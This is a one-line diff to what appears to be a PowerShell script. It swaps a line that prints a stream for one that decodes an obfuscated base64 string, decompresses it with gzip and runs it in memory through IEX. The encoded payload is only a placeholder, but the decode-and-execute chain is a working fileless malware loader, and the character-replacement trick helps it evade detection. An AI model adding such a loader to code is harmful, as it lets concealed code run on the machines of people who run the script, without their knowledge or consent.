@@ -1,1 +1,1 @@
-Write-Host New-Object IO.MemoryStream(,[Convert]::FromBase64String("[BASE64]"));
+$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("[BASE64]".Replace("!", "A")));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
